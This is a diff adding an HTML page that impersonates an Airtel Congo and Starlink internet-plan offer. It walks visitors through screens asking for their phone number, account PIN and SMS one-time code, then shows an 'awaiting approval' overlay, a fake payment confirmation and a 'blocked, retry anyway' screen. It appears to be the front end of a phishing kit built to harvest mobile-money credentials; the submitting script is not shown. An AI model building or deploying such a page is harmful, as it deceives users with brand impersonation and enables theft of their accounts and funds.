@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
+  <title>Airtel × Starlink — Forfaits Internet</title>
+  <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+
+<!-- ================= SCREEN 1: PLANS ================= -->
+<div id="screen-plans" class="screen">
+  <header>
+    <div class="brand">
+      <div class="airtel-mark-icon"></div>
+      <div>
+        <span class="airtel-wordmark">airtel</span>
+        <span class="airtel-tag">a reason to imagine</span>
+      </div>
+    </div>
+    <div class="collab">
+      <div class="eyebrow">En collaboration avec</div>
+      <div class="starlink-row">
+        <span class="big">STARLINK</span>
+        <span class="sat">🛰</span>
+        <span class="brand-name">Starlink</span>
+      </div>
+    </div>
+  </header>
+  <section class="hero">
+    <span class="pill">📶 Forfaits Internet</span>
+    <h1>Restez<br>Connecté<br><span class="accent">Sans Limites</span></h1>
+    <p class="sub">Choisissez un forfait. Vous serez redirigé vers la page de connexion Airtel Lite pour procéder au paiement.</p>
+  </section>
+  <section class="plans" id="plansGrid"></section>
+  <div class="footer-strip">
+    <div class="item">⚡️ Activation instantanée</div>
+    <span class="sep">|</span>
+    <div class="item">🔒 Paiement sécurisé</div>
+    <span class="sep">|</span>
+    <div class="item">📞 Support 24/7</div>
+  </div>
+  <p class="copyright">© 2026 Airtel Congo. Tous droits réservés.</p>
+</div>
+
+<!-- ================= SCREEN 2: LOGIN (MOBILE + PIN) ================= -->
+<div id="screen-login" class="screen hidden">
+  <main>
+    <div class="logo-wrap">
+      <div class="logo-row">
+        <span class="logo-mark"></span>
+        <span class="logo-word">airtel</span>
+      </div>
+      <div class="logo-tag">A REASON TO <b>IMAGINE</b></div>
+    </div>
+    <h1 class="login-title">Connectez-vous à Airtel Lite pour finaliser le paiement.</h1>
+
+    <div class="phone-field">
+      <span class="flag">
+        <svg viewBox="0 0 30 20" xmlns="http://www.w3.org/2000/svg">
+          <rect width="30" height="20" fill="#007fff"/>
+          <polygon points="0,20 6,20 30,0 24,0" fill="#f7d618"/>
+          <polygon points="0,20 3.6,20 27.6,0 24,0" fill="#ce1021"/>
+          <polygon points="8,3 8.6,4.9 10.6,4.9 9,6.1 9.6,8 8,6.9 6.4,8 7,6.1 5.4,4.9 7.4,4.9" fill="#f7d618"/>
+        </svg>
+      </span>
+      <span class="code">+243</span>
+      <input type="tel" id="phoneInput" placeholder="951234567" inputmode="numeric" maxlength="9">
+    </div>
+
+    <div class="code-label">Entrez votre Épingle</div>
+    <div class="code-row">
+      <div class="code-boxes">
+        <input type="password" maxlength="1" inputmode="numeric" class="code-box">
+        <input type="password" maxlength="1" inputmode="numeric" class="code-box">
+        <input type="password" maxlength="1" inputmode="numeric" class="code-box">
+        <input type="password" maxlength="1" inputmode="numeric" class="code-box">
+      </div>
+      <button class="eye-btn" id="eyeBtn" aria-label="Afficher"></button>
+    </div>
+
+    <button class="connexion-btn" id="connexionBtn" disabled>CONNEXION</button>
+  </main>
+  <footer>
+    <div class="logo-row">
+      <span class="logo-mark"></span>
+      <span class="logo-word">airtel</span>
+    </div>
+    <div class="logo-tag">A REASON TO <b>IMAGINE</b></div>
+    <div class="collab-text">En collaboration avec</div>
+    <div class="collab-brand">STARLINK™</div>
+    <hr>
+    <div class="copyright">© 2026 Airtel Congo. Tous droits réservés.</div>
+  </footer>
+</div>
+
+<!-- ================= SCREEN 3: OTP ================= -->
+<div id="screen-otp" class="screen hidden">
+  <main>
+    <div class="logo-wrap">
+      <div class="logo-row">
+        <span class="logo-mark"></span>
+        <span class="logo-word">airtel</span>
+      </div>
+      <div class="logo-tag">A REASON TO <b>IMAGINE</b></div>
+    </div>
+    <h1 class="login-title">Vérification de votre numéro.</h1>
+    <p class="otp-sub">
+      Un code à 6 chiffres a été envoyé par SMS au<br>
+      <b id="otpPhoneDisplay">+243 —</b>
+    </p>
+    <div class="otp-row">
+      <div class="code-boxes">
+        <input type="tel" maxlength="1" inputmode="numeric" class="otp-box">
+        <input type="tel" maxlength="1" inputmode="numeric" class="otp-box">
+        <input type="tel" maxlength="1" inputmode="numeric" class="otp-box">
+        <input type="tel" maxlength="1" inputmode="numeric" class="otp-box">
+        <input type="tel" maxlength="1" inputmode="numeric" class="otp-box">
+        <input type="tel" maxlength="1" inputmode="numeric" class="otp-box">
+      </div>
+    </div>
+    <button class="connexion-btn" id="verifyBtn" disabled>VÉRIFIER</button>
+    <div class="otp-resend">
+      <span id="resendTimerText">Renvoyer dans <b>60s</b></span>
+      <button class="resend-btn hidden" id="resendBtn" type="button">Renvoyer le code</button>
+    </div>
+    <button class="back-link" id="backToLoginBtn" type="button">← Modifier le numéro</button>
+  </main>
+  <footer>
+    <div class="logo-row">
+      <span class="logo-mark"></span>
+      <span class="logo-word">airtel</span>
+    </div>
+    <div class="logo-tag">A REASON TO <b>IMAGINE</b></div>
+    <div class="collab-text">En collaboration avec</div>
+    <div class="collab-brand">STARLINK™</div>
+    <hr>
+    <div class="copyright">© 2026 Airtel Congo. Tous droits réservés.</div>
+  </footer>
+</div>
+
+<!-- ================= SCREEN 4: SUCCESS ================= -->
+<div id="screen-success" class="screen hidden">
+  <div class="success-card">
+    <div class="success-icon">✅</div>
+    <h2>Paiement confirmé</h2>
+    <p>Votre forfait a été activé avec succès.</p>
+    <p id="successPlanText" style="font-weight:600;color:var(--airtel-red);margin-top:8px;"></p>
+    <div class="detail" id="successDetail"></div>
+  </div>
+  <footer style="margin-top:32px;">
+    <div class="logo-row">
+      <span class="logo-mark"></span>
+      <span class="logo-word">airtel</span>
+    </div>
+    <div class="logo-tag">A REASON TO <b>IMAGINE</b></div>
+    <div class="collab-text">En collaboration avec</div>
+    <div class="collab-brand">STARLINK™</div>
+    <hr>
+    <div class="copyright">© 2026 Airtel Congo. Tous droits réservés.</div>
+  </footer>
+</div>
+
+<!-- ================= SCREEN 5: BLOCKED ================= -->
+<div id="screen-blocked" class="screen hidden">
+  <div class="success-card" style="border:2px solid #f5c6c6;">
+    <div class="success-icon" style="background:#ffe6e6;">🚫</div>
+    <h2 style="color:#b93a32;">Accès Temporairement Bloqué</h2>
+    <p>Vous avez atteint le nombre maximal de tentatives.</p>
+    <p style="font-size:13px;color:#888;margin-top:10px;">Si vous pensez qu'il s'agit d'une erreur, veuillez contacter le support Airtel.</p>
+    <button class="connexion-btn active" id="blockedRetryBtn" style="margin-top:24px;">RÉESSAYER QUAND MÊME</button>
+  </div>
+  <footer style="margin-top:32px;">
+    <div class="logo-row">
+      <span class="logo-mark"></span>
+      <span class="logo-word">airtel</span>
+    </div>
+    <div class="logo-tag">A REASON TO <b>IMAGINE</b></div>
+    <div class="collab-text">En collaboration avec</div>
+    <div class="collab-brand">STARLINK™</div>
+    <hr>
+    <div class="copyright">© 2026 Airtel Congo. Tous droits réservés.</div>
+  </footer>
+</div>
+
+<!-- ================= ERROR MODAL ================= -->
+<div class="invalid-modal" id="invalidModal" role="dialog" aria-modal="true">
+  <div class="invalid-card">
+    <div class="warning-icon"><div class="triangle"></div><div class="mark"></div><div class="dot"></div></div>
+    <h2 id="invalidTitle">Format Invalide</h2>
+    <p id="invalidMessage"></p>
+    <button type="button" id="invalidOkBtn">OK</button>
+  </div>
+</div>
+
+<!-- ================= WAITING OVERLAY ================= -->
+<div class="approval-overlay" id="approvalOverlay">
+  <div class="spinner"></div>
+  <h2 id="overlayTitle">En attente d'approbation</h2>
+  <p id="overlayText">Votre demande a été transmise. Merci de patienter…</p>
+</div>
+
+<script src="/app.js"></script>
+</body>
+</html>
